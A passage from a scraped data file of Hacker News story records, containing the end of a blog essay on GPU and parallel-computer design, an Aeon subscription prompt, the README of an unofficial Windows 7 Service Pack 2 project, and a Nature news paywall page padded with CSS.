Phi. Another valuable facet of legacy is ISPC, and Matt Pharr’s blog on The story of ispc sheds light on the Larrabee project.\n\nLikely one of the problems of Larrabee was power consumption, which has emerged as one of the limiting factors in parallel computer performance. The fully coherent (total store order) memory hierarchy, while making software easier, also added to the cost of the system, and since then we’ve gained a lot of knowledge in how to write performant software in weaker memory models.\n\nAnother aspect that definitely held Larrabee back was the software, which is always challenging, especially for innovative directions. The drivers didn’t expose the special capabilities of the highly programmable hardware, and performance on traditional triangle-based 3D graphics scenes was underwhelming. Even so, it did quite well on CAD workloads involving lots of antialiased lines, driven by a standard OpenGL interface.\n\nThe changing workload\n\nEven within games, compute is becoming a much larger fraction of the total workload (for AI, it’s everything). Analysis of Starfield by Chips and Cheese shows that about half the time is in compute. The Nanite renderer also uses compute even for rasterization of small triangles, as hardware is only more efficient for triangles above a certain size. As games do more image filtering, global illumination, and primitives such as Gaussian splatting, the trend will almost certainly continue.\n\nIn 2009, Tim Sweeney gave a thought-provoking talk entitled The end of the GPU roadmap, in which he proposed that the concept of GPU would go away entirely, replaced by a highly parallel general purpose computer. That has not come to pass, though there has been some movement in that direction: the Larrabee project (as described above), the groundbreaking cudaraster paper from 2011 implemented the traditional 3D rasterization pipeline entirely in compute, and found (simplifying quite a bit) that it was about 2x slower than using fixed function hardware, and more recent academic GPU designs based on grids of RISC-V cores. It’s worth noting, a more recent update from Tellusim suggests that cudaraster-like rendering in compute can be close to parity on modern hardware.\n\nAn excellent 2017 presentation, Future Directions for Compute-for-Graphics by Andrew Lauritzen, highlighted many of the challenges of incorporating advanced compute techniques into graphics pipelines. There’s been some progress since then, but it speaks to many of the same problems I’m raising in this blog post. Also see comments by Josh Barczak, which also links the GRAMPS work and discusses issues with language support.\n\nPaths forward\n\nI can see a few ways to get from the current state to a good parallel computer. Each basically picks a starting point that might have been on the right track but got derailed.\n\nBig grid of cores: Cell reborn\n\nThe original promise of the Cell still has some appeal. A modern high end CPU chip has north of 100 billion transistors, while a reasonably competent RISC CPU can be made with orders of magnitude fewer. Why not place hundreds or even thousands of cores on a chip? For maximum throughput, put a vector (SIMD) unit on each core. Indeed, there are at least two AI accelerator chips based on this idea: Esperanto and Tenstorrent. I’m particularly interested in the latter because its software stack is open source.\n\nThat said, there are most definitely challenges. A CPU by itself isn’t enough, it also needs high bandwidth local memory and communications with other cores. One reason the Cell was so hard to program is that the local memory was small and needed to be managed explicitly - your program needed to do explicit transfers through the network to get data in and out. The trend in CPU (and GPU) design is to virtualize everything, so that there’s an abstraction of a big pool of memory that all the cores share. You’ll still want to make your algorithm cache-aware for performance, but if not, the program will still run. It’s possible a sufficiently smart compiler can adapt a high-level description of the problem to the actual hardware (and this is the approach taken by Tenstorrent’s TT-Buda stack, specialized to AI workloads). In analogy to exploiting instruction-level parallelism through VLIW, the Itanium stands as a cautionary tale.\n\nFrom my read of the Tenstorrent docs, the matrix unit is limited to just matrix multiplication and a few supporting operations such as transpose, so it’s not clear it would be a significant speedup for complex algorithms as needed in 2D rendering. But I think it’s worth exploring, to see how far it can be pushed, and perhaps whether practical extensions to the matrix unit to support permutations and so on would unlock more algorithms.\n\nMost of the “big grid of cores” designs are targeted toward AI acceleration, and for good reason: it is hungry for raw throughput with low power costs, so alternatives to traditional CPU approaches are appealing. See the New Silicon for Supercomputers talk by Ian Cutress for a great survey of the field.\n\nRunning Vulkan commands from GPU-side\n\nA relatively small delta to existing GPUs would be the ability to dispatch work from a controller mounted on the GPU and sharing address space with the shaders. In its most general form, users would be able to run threads on this controller that could run the full graphics API (for example, Vulkan). The programming model could be similar to now, just that the thread submitting work is running close to the compute units and therefore has dramatically lower latency.\n\nIn their earliest form, GPU’s were not distributed systems, they were co-processors, tightly coupled to the host CPU’s instruction stream. These days, work is issued to the GPU by the equivalent of async remote procedure calls, with end-to-end latency often as high as 100µs. This proposal essentially calls for a return to less of a distributed system model, where work can efficiently be issued on a much finer grain and with much more responsiveness to the data. For dynamic work creation, latency is the most important blocker.\n\nNote that GPU APIs are slowly inventing a more complex, more limited version of this anyway. While it’s not possible to run the Vulkan API directly from a shader, with a recent Vulkan extension (VK_EXT_device_generated_commands) it is possible to encode some commands into a command buffer from a shader. Metal has this capability as well (see gpuweb#431 for more details about portability). It’s worth noting that the ability to run indirect commands to recursively generate more work is one of the missing functions; it seems that the designers did not take Hofstadter to heart.\n\nIt is interesting to contemplate actually running Vulkan API directly from a shader. Since the Vulkan API is expressed in terms of C, one of the requirements is the ability to run C. This is being done on an experimental basis (see the vcc project), but is not yet practical. Of course, CUDA can run C. CUDA 12.4 also has support for conditional nodes, and as of 12.0 it had support for device graph launch, which reduces latency considerably.\n\nWork graphs\n\nWork graphs are a recent new extension to the GPU execution model. Briefly, the program is structured as a graph of nodes (kernel programs) and edges (queues) all running in parallel. As a node generates output, filling its output queues, the GPU dispatches kernels (at workgroup granularity) to process those outputs further. To a large extent, this is a modern reinvention of the GRAMPS idea.\n\nWhile exciting, and very likely useful for an increasing range of graphics tasks, work graphs also have serious limitations; I researched whether I could use them for the existing Vello design and found three major problems. First, they cannot easily express joins, where progress of a node is dependent on synchronized input from two different queues. Vello uses joins extensively, for example one kernel to compute a bounding box of a draw object (aggregating multiple path segments), and another to process the geometry within that bounding box. Second, there is no ordering guarantee between the elements pushed into a queue, and 2D graphics ultimately does require ordering (the whiskers of the tiger must be drawn over the tiger’s face). Third, work graphs don’t support variable-size elements.\n\nThe lack of an ordering guarantee is particularly frustrating, because the traditional 3D pipeline does maintain ordering, among other reasons, to prevent Z-fighting artifacts (for a fascinating discussion of how GPU hardware preserves the blend order guarantee, see A trip through the Graphics Pipeline part 9). It is not possible to faithfully emulate the traditional vertex/fragment pipeline using the new capability. Obviously, maintaining ordering guarantees in parallel systems is expensive, but ideally there is a way to opt in when needed, or at least couple work graphs with another mechanism (some form of sorting, which is possible to implement efficiently on GPUs) to re-establish ordering as needed. Thus, I see work graphs as two steps forward, one step back.\n\nCPU convergent evolution\n\nIn theory, when running highly parallel workloads, a traditional multi-core CPU design is doing the same thing as a GPU, and if fully optimized for efficiency, should be competitive. That, arguably, is the design brief for Larrabee, and also motivation for more recent academic work like Vortex. Probably the biggest challenge is power efficiency. As a general trend, CPU designs are diverging into those optimizing single-core performance (performance cores) and those optimizing power efficiency (efficiency cores), with cores of both types commonly present on the same chip. As E-cores become more prevalent, algorithms designed to exploit parallelism at scale may start winning, incentivizing provision of even larger numbers of increasingly efficient cores, even if underpowered for single-threaded tasks.\n\nAn advantage of this approach is that it doesn’t change the execution model, so existing languages and tools can still be used. Unfortunately, most existing languages are poor at expressing and exploiting parallelism at both the SIMD and thread level – shaders have a more limited execution model but at least it’s clear how to execute them in parallel efficiently. And for thread-level parallelism, avoiding performance loss from context switches is challenging. Hopefully, newer languages such as Mojo will help, and potentially can be adapted to GPU-like execution models as well.\n\nI’m skeptical this approach will actually become competitive with GPUs and AI accelerators, as there is just a huge gap in throughput per watt compared with GPUs – about an order of magnitude. Also, GPUs and AI accelerators won’t be standing still either.\n\nMaybe the hardware is already there?\n\nIt’s possible that there is hardware currently shipping that meets my criteria for a good parallel computer, but its potential is held back by software. GPUs generally have a “command processor” onboard, which, in cooperation with the host-side driver, breaks down the rendering and compute commands into chunks to be run by the actual execution units. Invariably, this command processor is hidden and cannot run user code. Opening that up could be quite interesting. A taste of that is in Hans-Kristian Arntzen’s notes on implementing work graphs in open source drivers: Workgraphs in vkd3d-proton.\n\nGPU designs vary in how much is baked into the hardware and how much is done by a command processor. Programmability is a good way to make things more flexible. The main limiting factor is the secrecy around such designs. Even in GPUs with open source drivers, the firmware (which is what runs on the command processor) is very locked down. Of course, a related challenge is security; opening up the command processor to user code increases the vulnerability surface area considerably. But from a research perspective, it should be interesting to explore what’s possible aside from security concerns.\n\nAnother interesting direction is the rise of “Accelerated Processing Units” which integrate GPUs and powerful CPUs in the same address space. Conceptually, these are similar to integrated graphics chips, but those rarely have enough performance to be interesting. From what I’ve seen, running existing APIs on such hardware (Vulkan for compute shaders, or one of the modern variants of OpenCL) would not have significant latency advantages for synchronizing work back to the CPU, due to context switching overhead. It’s possible a high priority or dedicated thread might quickly process items placed in a queue by GPU-side tasks. The key idea is queues running at full throughput, rather than async remote procedure calls with potentially huge latency.\n\nComplexity\n\nTaking a step back, one of the main features of the GPU ecosystem is a dizzying level of complexity. There’s the core parallel computer, then lots of special function hardware (and the scope of this is increasing, especially with newer features such as ray tracing), then big clunky mechanisms to get work scheduled and run. Those start with the basic compute shader dispatch mechanism (a 3D grid of x, y, z dimensions, 16 bits each), and then augment that with various indirect command encoding extensions.\n\nWork graphs also fit into the category of complexifying the execution model to work around the limitations of the primitive 3D grid. I was initially excited about their prospect, but when I took a closer look, I found they were inadequate for expressing any of the producer/consumer relationships in Vello.\n\nThere’s a lot of accidental complexity as well. There are multiple competing APIs, each with subtly different semantics, which makes it especially hard to write code once and have it just work.\n\nCUDA is adding lots of new features, some of which improve autonomy as I’ve been wanting, and there is a tendency for graphics APIs to adopt features from CUDA. However, there’s also a lot of divergence between these ecosystems (work graphs can’t be readily adapted to CUDA, and it’s very unlikely graphics shaders will get independent thread scheduling any time soon).\n\nThe complexity of the GPU ecosystem has many downstream effects. Drivers and shader compilers are buggy and insecure, and there is probably no path to really fixing that. Core APIs tend to be very limited in functionality and performance, so there’s a dazzling array of extensions that need to be detected at runtime, and the most appropriate permutation selected. This in turn makes it far more likely to run into bugs that appear only with specific combinations of features, or on particular hardware.\n\nAll this is in fairly stark contrast to the CPU world. A modern CPU is also dazzlingly complex, with billions of transistors, but it is rooted in a much simpler computational model. From a programmer perspective, writing code for a 25 billion transistor Apple M3 isn’t that different from, say, a Cortex M0, which can be made with about 48,000 transistors. Similarly, a low performance RISC-V implementation is a reasonable student project. Obviously the M3 is doing a lot more with branch prediction, superscalar issue, memory hierarchies, op fusion, and other performance tricks, but it’s recognizably doing the same thing as a vastly smaller and simpler chip.\n\nIn the past, there were economic pressures towards replacing special-purpose circuitry with general purpose compute performance, but those incentives are shifting. Basically, if you’re optimizing for number of transistors, then somewhat less efficient general purpose compute can be kept busy almost all the time, while special purpose hardware is only justified if there is high enough utilization in the workload. However, as Dennard scaling has ended and we’re more constrained by power than transistor count, special purpose hardware starts winning more; it can simply be powered down if it isn’t used by the workload. The days of a purely RISC computational model are probably over. What I’d like to see replacing it is an agile core (likely RISC-V) serving as the control function for a bunch of special-purpose accelerator extensions. That certainly is the model of the Vortex project among others.\n\nConclusion\n\nIn his talk shortly before retirement, Nvidia GPU architect Erik Lindholm said (in the context of work creation and queuing systems), “my career has been about making things more flexible, more programmable. It’s not finished yet. There’s one more step that I feel that needs to be done, and I’ve been pursuing this at Nvidia Research for many years.” I agree, and my own work would benefit greatly. Now that he has retired, it is not clear who will take up the mantle. It may be Nvidia disrupting their previous product line with a new approach as they have in the past. It may be an upstart AI accelerator making a huge grid of low power processors with vector units, that just happens to be programmable. It might be CPU efficiency cores evolving to become so efficient they compete with GPUs.\n\nOr it might not happen at all. On the current trajectory, GPUs will squeeze out incremental improvements on existing graphics workloads at the cost of increasing complexity, and AI accelerators will focus on improving the throughput of slop generation to the exclusion of everything else.\n\nIn any case, there is an opportunity for intellectually curious people to explore the alternate universe in which the good parallel computer exists; architectures can be simulated on FPGA like Vortex, and algorithms can be prototyped on multicore wide-SIMD CPUs. We can also start to think about what a proper programming language for such a machine might look like, as frustrating as it is to not have real hardware to run it on.\n\nProgress on a good parallel computer would help my own little sliver of work, trying to make a fully parallel 2D renderer with modest resource requirements. I’ve got to imagine it would in addition help AI efforts, potentially unlocking sparse techniques that can’t run on existing hardware. I also think there’s a golden era of algorithms that can be parallel but aren’t a win on current GPUs, waiting to be developed.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "caf646d9cc67a1a6",
    "title": {
      "en": "There's no emotion we ought to think harder about than anger",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://aeon.co/essays/there-s-no-emotion-we-ought-to-think-harder-about-than-anger",
    "score": 45,
    "by": "privong",
    "time": 1742675507,
    "content": "Join over 250,000+ newsletter subscribersJoin over 250,000+ newsletter subscribers.Our content is 100 per cent free and you can unsubscribe anytime.Our content is 100 per cent free and you can unsubscribe anytime.Daily: A daily dose of essays, guides and videos from Aeon+PsycheWeekly: A week’s worth of big ideas from AeonSign upI’m already subscribedPrivacy Policy\n\nAt a time when misinformation abounds, it is vital that expert knowledge be accessible to all.At a time when misinformation abounds, it is vital that expert knowledge be accessible to all.Your donation, whatever the size, supports our mission to ask the big questions and deliver fresh, original insights from leading thinkers.\nIf you value what we do, will you support us?Your donation, whatever the size, supports our mission to ask the big questions and deliver fresh, original insights from leading thinkers.\nIf you value what we do, will you support us?I would like to donate:MonthlyAnnuallyOne-timeSelect amount (US dollars):$5 per month$10 per monthDonate now",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "0f9ecfa7eec46811",
    "title": {
      "en": "Unofficial Windows 7 Service Pack 2",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/i486girl/win7-sp2",
    "score": 27,
    "by": "XzetaU8",
    "time": 1742643903,
    "content": "Windows 7 Service Pack 2\nWarningThis project is far from finished, meaning that bugs are to be expected. If you encounter any bugs, please report them in the issue tracker or in the Discord server. Thank you for your understanding.\n\nWindows 7 Service Pack 2 is a package consisting of updates, tweaks, backported apps and overall enhancements with the goal of providing an effortless way to have a fully updated Windows 7 ISO and enhancing usability on semi-modern machines.\nTODOs\n\n - All updates until 2020, with the addition of Windows Embedded Standard 7 updates\n - Snipping Tool from Windows 10 version 1507 -> Credits: vxiduu\n - Paint from Windows 8 build 9425\n - Registry Editor from Windows 10 build 16212 -> Credits: Aurorarion\n - In-place service pack installer\n - Native USB 3.0 and NVMe support -> Credits: Unknown user from MyDigitalLife forums\n - TPM 2.0 support\n - UEFI support in the ISO releases, with EFI GOP support too -> Credits: Typical/int10h, AveragePC\n - Inclusion of VxKex -> Credits: vxiduu\n - Windows 8 PE in the ISO, with a theme that resembles Windows 7 -> Credits: ImSwordQueen (Windows 7 theme for Windows 8.x)\n - Windows 10 setup engine in the ISO release -> Credits: Aurorarion (helping out on the 10 setup engine port)\n - Builtin Webp and FLAC codecs\n - Task Manager from Windows 8 build 7880 -> Credits: Jevil7452\n - Upscaled graphics in some places\n - Windows Vista/7 PE's boot screen on the ISO -> Credits: Microsoft Corporation and Tech Stuff (Boot8Plus)\n - Removal of the annoying \"Unsupported hardware\" prompt\n - Better DPI support in aero.msstyles -> Credits: Vaporvance (high DPI classes from Aero10 that will be ported to Windows 7)\n - Integration of Microsoft Visual C++ Redistributable AIO -> Credits: Microsoft Corporation (Visual C++) and abbodi1406 (VC++ AIO repack)\n - Disk Cleanup from Windows 8 build 7861 -> Credits: Jevil7452\n - Windows 8 build 7861's PDF Reader -> Credits: Jevil7452\n - Windows 10 20H1's System Information -> Credits: Jevil7452\n - Windows 11 24H2's timeout.exe command\n - Windows 10 1709's XPS Viewer\n - Windows 11 24H2's sudo.exe command\n - Windows 10 build 9845's Notepad\n - Windows Management Framework 5.1\n - Segoe UI Emoji\n - Microsoft Agent\n - WinHlp32\n - Work Folders\n - Restore Windows Journal\n - Microsoft Camera Codec Pack\n\nInstallation\nCautionFailure to follow instructions properly will result in a bricked system! We do not take responsibility for this unless this is a legitimate bug in the installer!\n\nImportantRAID/Intel RST only works on specific systems!\n\nWarningBoth versions of the Windows 7 Service Pack 2 are x64 only! Don't file issues over the lack of 32-bit hardware support as we do not plan to support 32-bit hardware. Consult the FAQ for more information.\n\nISO installation\nImportantThe ISO releases are for clean installs only. For in-place installs, please use the installer once we release a working version of it.\n\nPick the UEFI or Legacy Boot version, depending on what your system uses\nFlash it onto a DVD or a USB flash drive\nBoot from the Windows 7 install media on the machine you wish to install it in\nProceed as usual\nFinish the out of box experience\n\nIn-place intallation\n\nDownload the Windows 7 SP2 installer under the releases of this repository\nFollow the steps in the installer as usual\n\nWarningIf the installer is stuck at a certain percentage (during the Upgrading Windows phase), don't turn off your computer! Doing so will brick your system!\n\nFAQ\nQ: My system is 32-bit in hardware. Why won't the installer and the ISO run?\nA: Supporting both 64-bit and 32-bit Windows would be very time consuming, so we chose to support only 64-bit systems. Please don't file any issues regarding the lack of 32-bit support as we have no interests of making any releases targeting 32-bit hardware.\nQ: Why don't you include ESU updates?\nA: ESU updates will be rolled out by Microsoft until 2026, and unfortunately adding ESU updates will be time consuming as it requires us to roll out new releases every time a batch of ESU updates gets rolled out.\nQ: Why VxKex instead of the dotexe1337 Windows 7 Extended Kernel?\nA: VxKex is safer than dotexe's Windows 7 Extended Kernel as it relies on external DLLs.\nQ: Does this include custom integrated GPU dri-\nA: NO\nQ: Why aren't my drives appearing in the Windows Setup screen?\nA: If you are using an RAID/RST configuration, it may well likely be that the drivers installed do not work.\nOther credits\n\nK4sum1: Inspiration for creating Windows 7 SP2\nGMM2003: \"Under construction\" wallpaper used in Public Beta builds\nOur contributors\nAnyone who reports bugs constantly",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "feb73d0638f074a2",
    "title": {
      "en": "Ancient DNA Shows Stone Age Europeans Voyaged by Sea to Africa",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.nature.com/articles/d41586-025-00764-2",
    "score": 113,
    "by": "gmays",
    "time": 1742494980,
    "content": "NEWS\n                12 March 2025\n\n            Ancient DNA shows Stone Age Europeans voyaged by sea to Africa\n\n                    Roughly 8,000-year-old remains unearthed from present-day Tunisia held a surprise: European hunter-gatherer ancestry.\n\n                By\n\n                Ewen Callaway\n\n                    Ewen Callaway\n\n                            View author publications\n\n                                You can also search for this author in PubMed\n                                    Google Scholar\n\n            Twitter\n\n            Facebook\n\n            Email\n\n        <div class=\"c-nature-box c-nature-box--side \" data-component=\"entitlement-box\">\n\n            <div class=\"js-access-button\">\n                <a href=\"https://wayf.springernature.com?redirect_uri&#x3D;https%3A%2F%2Fwww.nature.com%2Farticles%2Fd41586-025-00764-2\" class=\"c-article__button\" data-test=\"ra21\">\n                    <svg class=\"u-icon\" width=\"18\" height=\"18\" aria-hidden=\"true\" focusable=\"false\"><use href=\"#icon-institution\"></use></svg>\n                    <span class=\"c-article__button-text\">Access through your institution</span>\n                </a>\n            </div>\n\n            <div class=\"js-buy-button\">\n                <a href=\"#access-options\" class=\"c-article__button c-article__button--inverted\" data-test=\"ra21\">\n                    <span>Buy or subscribe</span>\n                </a>\n            </div>\n\n        </div>\n\n                        .readcube-buybox { display: none !important;}\n\n                    Thousands of years before Odysseus crossed the ‘wine-dark sea’ in Homer’s epic poem The Odyssey, hunter-gatherers might have island-hopped their way to Africa across the Mediterranean.\n\n                        Access options\n\n        <div class=\"c-nature-box c-nature-box--side \" data-component=\"entitlement-box\">\n\n            <div class=\"js-access-button\">\n                <a href=\"https://wayf.springernature.com?redirect_uri&#x3D;https%3A%2F%2Fwww.nature.com%2Farticles%2Fd41586-025-00764-2\" class=\"c-article__button\" data-test=\"ra21\">\n                    <svg class=\"u-icon\" width=\"18\" height=\"18\" aria-hidden=\"true\" focusable=\"false\"><use href=\"#icon-institution\"></use></svg>\n                    <span class=\"c-article__button-text\">Access through your institution</span>\n                </a>\n            </div>\n\n        </div>\n\n                Access through your institution\n\n                Change institution\n\n                Buy or subscribe\n\n    /* style specs start */\n\n/* style specs end */\n\n        Access Nature and 54 other Nature Portfolio journals\n\n        Get Nature+, our best-value online-access subscription\n\n          24,99€ /30days\n\n        cancel any time\n\n        Learn more\n\n    Subscription info for Korean customersWe have a dedicated website for our Korean customers. Please go to natureasia.com to subscribe to this journal.Go to natureasia.com\n\n      Rent or buy this article\n      Prices vary by article type\n      from$1.95\n      to$39.95\n\n        Learn more\n\n    Prices may be subject to local taxes which are calculated during checkout\n          /* style specs start */\n          style {\n            display: none !important;\n          }\n          .LiveAreaSection * {\n            align-content: stretch;\n            align-items: stretch;\n            align-self: auto;\n            animation-delay: 0s;\n            animation-direction: normal;\n            animation-duration: 0s;\n            animation-fill-mode: none;\n            animation-iteration-count: 1;\n            animation-name: none;\n            animation-play-state: running;\n            animation-timing-function: ease;\n            azimuth: center;\n            backface-visibility: visible;\n            background-attachment: scroll;\n            background-blend-mode: normal;\n            background-clip: borderBox;\n            background-color: transparent;\n            background-image: none;\n            background-origin: paddingBox;\n            background-position: 0 0;\n            background-repeat: repeat;\n            background-size: auto auto;\n            block-size: auto;\n            border-block-end-color: currentcolor;\n            border-block-end-style: none;\n            border-block-end-width: medium;\n            border-block-start-color: currentcolor;\n            border-block-start-style: none;\n            border-block-start-width: medium;\n            border-bottom-color: currentcolor;\n            border-bottom-left-radius: 0;\n            border-bottom-right-radius: 0;\n            border-bottom-style: none;\n            border-bottom-width: medium;\n            border-collapse: separate;\n            border-image-outset: 0s;\n            border-image-repeat: stretch;\n            border-image-slice: 100%;\n            border-image-source: none;\n            border-image-width: 1;\n            border-inline-end-color: currentcolor;\n            border-inline-end-style: none;\n            border-inline-end-width: medium;\n            border-inline-start-color: currentcolor;\n            border-inline-start-style: none;\n            border-inline-start-width: medium;\n            border-left-color: currentcolor;\n            border-left-style: none;\n            border-left-width: medium;\n            border-right-color: currentcolor;\n            border-right-style: none;\n            border-right-width: medium;\n            border-spacing: 0;\n            border-top-color: currentcolor;\n            border-top-left-radius: 0;\n            border-top-right-radius: 0;\n            border-top-style: none;\n            border-top-width: medium;\n            bottom: auto;\n            box-decoration-break: slice;\n            box-shadow: none;\n            box-sizing: border-box;\n            break-after: auto;\n            break-before: auto;\n            break-inside: auto;\n            caption-side: top;\n            caret-color: auto;\n            clear: none;\n            clip: auto;\n            clip-path: none;\n            color: initial;\n            column-count: auto;\n            column-fill: balance;\n            column-gap: normal;\n            column-rule-color: currentcolor;\n            column-rule-style: none;\n            column-rule-width: medium;\n            column-span: none;\n            column-width: auto;\n            content: normal;\n            counter-increment: none;\n            counter-reset: none;\n            cursor: auto;\n            display: inline;\n            empty-cells: show;\n            filter: none;\n            flex-basis: auto;\n            flex-direction: row;\n            flex-grow: 0;\n            flex-shrink: 1;\n            flex-wrap: nowrap;\n            float: none;\n            font-family: initial;\n            font-feature-settings: normal;\n            font-kerning: auto;\n            font-language-override: normal;\n            font-size: medium;\n            font-size-adjust: none;\n            font-stretch: normal;\n            font-style: normal;\n            font-synthesis: weight style;\n            font-variant: normal;\n            font-variant-alternates: normal;\n            font-variant-caps: normal;\n            font-variant-east-asian: normal;\n            font-variant-ligatures: normal;\n            font-variant-numeric: normal;\n            font-variant-position: normal;\n            font-weight: 400;\n            grid-auto-columns: auto;\n            grid-auto-flow: row;\n            grid-auto-rows: auto;\n            grid-column-end: auto;\n            grid-column-gap: 0;\n            grid-column-start: auto;\n            grid-row-end: auto;\n            grid-row-gap: 0;\n            grid-row-start: auto;\n            grid-template-areas: none;\n            grid-template-columns: none;\n            grid-template-rows: none;\n            height: auto;\n            hyphens: manual;\n            image-orientation: 0deg;\n            image-rendering: auto;\n            image-resolution: 1dppx;\n            ime-mode: auto;\n            inline-size: auto;\n            isolation: auto;\n            justify-content: flexStart;\n            left: auto;\n            letter-spacing: normal;\n            line-break: auto;\n            line-height: normal;\n            list-style-image: none;\n            list-style-position: outside;\n            list-style-type: disc;\n            margin-block-end: 0;\n            margin-block-start: 0;\n            margin-bottom: 0;\n            margin-inline-end: 0;\n            margin-inline-start: 0;\n            margin-left: 0;\n            margin-right: 0;\n            margin-top: 0;\n            mask-clip: borderBox;\n            mask-composite: add;\n            mask-image: none;\n            mask-mode: matchSource;\n            mask-origin: borderBox;\n            mask-position: 0 0;\n            mask-repeat: repeat;\n            mask-size: auto;\n            mask-type: luminance;\n            max-height: none;\n            max-width: none;\n            min-block-size: 0;\n            min-height: 0;\n            min-inline-size: 0;\n            min-width: 0;\n            mix-blend-mode: normal;\n            object-fit: fill;\n            object-position: 50% 50%;\n            offset-block-end: auto;\n            offset-block-start: auto;\n            offset-inline-end: auto;\n            offset-inline-start: auto;\n            opacity: 1;\n            order: 0;\n            orphans: 2;\n            outline-color: initial;\n            outline-offset: 0;\n            outline-style: none;\n            outline-width: medium;\n            overflow: visible;\n            overflow-wrap: normal;\n            overflow-x: visible;\n            overflow-y: visible;\n            padding-block-end: 0;\n            padding-block-start: 0;\n            padding-bottom: 0;\n            padding-inline-end: 0;\n            padding-inline-start: 0;\n            padding-left: 0;\n            padding-right: 0;\n            padding-top: 0;\n            page-break-after: auto;\n            page-break-before: auto;\n            page-break-inside: auto;\n            perspective: none;\n            perspective-origin: 50% 50%;\n            pointer-events: auto;\n            position: static;\n            quotes: initial;\n            resize: none;\n            right: auto;\n            ruby-align: spaceAround;\n            ruby-merge: separate;\n            ruby-position: over;\n            scroll-behavior: auto;\n            scroll-snap-coordinate: none;\n            scroll-snap-destination: 0 0;\n            scroll-snap-points-x: none;\n            scroll-snap-points-y: none;\n            scroll-snap-type: none;\n            shape-image-threshold: 0;\n            shape-margin: 0;\n            shape-outside: none;\n            tab-size: 8;\n            table-layout: auto;\n            text-align: initial;\n            text-align-last: auto;\n            text-combine-upright: none;\n            text-decoration-color: currentcolor;\n            text-decoration-line: none;\n            text-decoration-style: solid;\n            text-emphasis-color: currentcolor;\n            text-emphasis-position: over right;\n            text-emphasis-style: none;\n            text-indent: 0;\n            text-justify: auto;\n            text-orientation: mixed;\n            text-overflow: clip;\n            text-rendering: auto;\n            text-shadow: none;\n            text-transform: none;\n            text-underline-position: auto;\n            top: auto;\n            touch-action: auto;\n            transform: none;\n            transform-box: borderBox;\n            transform-origin: 50% 50%0;\n            transform-style: flat;\n            transition-delay: 0s;\n            transition-duration: 0s;\n            transition-property: all;\n            transition-timing-function: ease;\n            vertical-align: baseline;\n            visibility: visible;\n            white-space: normal;\n            widows: 2;\n            width: auto;\n            will-change: auto;\n            word-break: normal;\n            word-spacing: normal;\n            word-wrap: normal;\n            writing-mode: horizontalTb;\n            z-index: auto;\n            -webkit-appearance: none;\n            -moz-appearance: none;\n            -ms-appearance: none;\n            appearance: none;\n            margin: 0;\n          }\n          .LiveAreaSection {\n            width: 100%;\n          }\n          .LiveAreaSection .login-option-buybox {\n            display: block;\n            width: 100%;\n            font-size: 17px;\n            line-height: 30px;\n            color: #222;\n            padding-top: 30px;\n            font-family: Harding, Palatino, serif;\n          }\n          .LiveAreaSection .additional-access-options {\n            display: block;\n            font-weight: 700;\n            font-size: 17px;\n            line-height: 30px;\n            color: #222;\n            font-family: Harding, Palatino, serif;\n          }\n          .LiveAreaSection .additional-login > li:not(:first-child)::before {\n            transform: translateY(-50%);\n            content: \"\";\n            height: 1rem;\n            position: absolute;\n            top: 50%;\n            left: 0;\n            border-left: 2px solid #999;\n          }\n          .LiveAreaSection .additional-login > li:not(:first-child) {\n            padding-left: 10px;\n          }\n          .LiveAreaSection .additional-login > li {\n            display: inline-block;\n            position: relative;\n            vertical-align: middle;\n            padding-right: 10px;\n          }\n          .BuyBoxSection {\n            display: flex;\n            flex-wrap: wrap;\n            flex: 1;\n            flex-direction: row-reverse;\n            margin: -30px -15px 0;\n          }\n          .BuyBoxSection .box-inner {\n            width: 100%;\n            height: 100%;\n            padding: 30px 5px;\n            display: flex;\n            flex-direction: column;\n            justify-content: space-between;\n          }\n          .BuyBoxSection p {\n            margin: 0;\n          }\n          .BuyBoxSection .readcube-buybox {\n            background-color: #f3f3f3;\n            flex-shrink: 1;\n            flex-grow: 1;\n            flex-basis: 255px;\n            background-clip: content-box;\n            padding: 0 15px;\n            margin-top: 30px;\n          }\n          .BuyBoxSection .subscribe-buybox {\n            background-color: #f3f3f3;\n            flex-shrink: 1;\n            flex-grow: 4;\n            flex-basis: 300px;\n            background-clip: content-box;\n            padding: 0 15px;\n            margin-top: 30px;\n          }\n          .BuyBoxSection .subscribe-buybox-nature-plus {\n            background-color: #f3f3f3;\n            flex-shrink: 1;\n            flex-grow: 4;\n            flex-basis: 100%;\n            background-clip: content-box;\n            padding: 0 15px;\n            margin-top: 30px;\n          }\n          .BuyBoxSection .title-readcube,\n          .BuyBoxSection .title-buybox {\n            display: block;\n            margin: 0;\n            margin-right: 10%;\n            margin-left: 10%;\n            font-size: 24px;\n            line-height: 32px;\n            color: #222;\n            text-align: center;\n            font-family: Harding, Palatino, serif;\n          }\n          .BuyBoxSection .title-asia-buybox {\n            display: block;\n            margin: 0;\n            margin-right: 5%;\n            margin-left: 5%;\n            font-size: 24px;\n            line-height: 32px;\n            color: #222;\n            text-align: center;\n            font-family: Harding, Palatino, serif;\n          }\n          .BuyBoxSection .asia-link,\n          .Link-328123652,\n          .Link-2926870917,\n          .Link-2291679238,\n          .Link-595459207 {\n            color: #069;\n            cursor: pointer;\n            text-decoration: none;\n            font-size: 1.05em;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 1.05em6;\n          }\n          .BuyBoxSection .access-readcube {\n            display: block;\n            margin: 0;\n            margin-right: 10%;\n            margin-left: 10%;\n            font-size: 14px;\n            color: #222;\n            padding-top: 10px;\n            text-align: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              Oxygen-Sans, Ubuntu, Cantarell, \"Helvetica Neue\", sans-serif;\n            line-height: 20px;\n          }\n          .BuyBoxSection ul {\n            margin: 0;\n          }\n          .BuyBoxSection .link-usp {\n            display: list-item;\n            margin: 0;\n            margin-left: 20px;\n            padding-top: 6px;\n            list-style-position: inside;\n          }\n          .BuyBoxSection .link-usp span {\n            font-size: 14px;\n            color: #222;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto,\n              